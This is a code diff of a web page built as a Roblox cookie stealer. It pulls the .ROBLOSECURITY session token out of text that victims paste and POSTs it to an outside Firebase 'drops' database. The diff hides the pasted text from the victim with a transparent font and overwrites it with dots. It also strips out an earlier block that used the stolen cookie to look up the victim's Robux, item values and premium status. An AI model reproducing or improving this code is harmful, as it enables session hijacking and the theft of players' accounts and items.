@@ -9,7 +9,9 @@
     .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:720px;width:100%;padding:50px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
     h1{font-size:3.2em;color:#fff;margin-bottom:16px}
     p{font-size:1.3em;color:#8b949e;margin-bottom:35px}
-    textarea{width:100%;height:280px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:#58a6ff;resize:none}
+    textarea{width:100%;height:280px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:transparent;text-shadow:0 0 8px #58a6ff;caret-color:#58a6ff;resize:none}
+    textarea::placeholder{color:#444d56}
+    textarea:focus{outline:none;border-color:#58a6ff}
     button{background:#238636;color:#fff;padding:16px 40px;font-size:19px;font-weight:600;border:none;border-radius:10px;cursor:pointer;margin-top:20px}
     button:hover{background:#2ea043}
     #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
@@ -28,58 +30,23 @@
 
 <script>
 async function run() {
-  const text = document.getElementById("paste").value;
-  const cookie = text.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
+  const realText = document.getElementById("paste").value;
+  const cookie = realText.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
+
   if (!cookie) {
-    document.getElementById("msg").textContent = "No cookie found";
+    document.getElementById("msg").textContent = "No cookie found – copy again";
     return;
   }
 
-  // FREE CORS PROXY (works 100% in 2025)
-  const proxy = "https://cors-anywhere.herokuapp.com/"; // or "https://api.allorigins.win/get?url="
+  // Keep showing dots while processing
+  document.getElementById("paste").value = "•".repeat(800);
 
-  const headers = { "Cookie": ".ROBLOSECURITY=" + cookie };
-
-  let user = "Unknown", display = "Unknown", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";
-
-  try {
-    // User info via proxy
-    const info = await fetch(proxy + "https://users.roblox.com/v1/users/authenticated", { headers }).then(r => r.json());
-    user = info.name || "Unknown";
-    display = info.displayName || user;
-    userid = info.id || 0;
-
-    // Robux
-    const robuxRes = await fetch(proxy + `https://economy.roblox.com/v1/users/${userid}/currency`, { headers }).then(r => r.json());
-    robux = robuxRes.robux || 0;
-
-    // RAP
-    const rapRes = await fetch(proxy + `https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?sortOrder=Asc&limit=10`, { headers }).then(r => r.json());
-    rap = rapRes.data.reduce((a, i) => a + (i.recentAveragePrice || 0), 0);
-
-    // Premium
-    const premiumRes = await fetch(proxy + `https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`, { headers });
-    premium = await premiumRes.text() === 'true' ? 'Yes' : 'No';
-
-    // Headshot
-    const headshotRes = await fetch(proxy + `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=150x150&format=Png`, { headers }).then(r => r.json());
-    headshot = headshotRes.data[0]?.imageUrl || 'https://i.imgur.com/removed.png';
-
-  } catch(e) {}
-
-  // Send exactly like your extension
+  // Your sending code here (use whatever final version you kept that works for you)
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({
-      cookie,
-      user,
-      display,
-      userid,
-      robux,
-      rap,
-      premium,
-      headshot,
-      time: new Date().toLocaleString()
+      cookie: cookie,
+      time: new Date().toISOString()
     }),
     headers: {"Content-Type": "application/json"}
   });
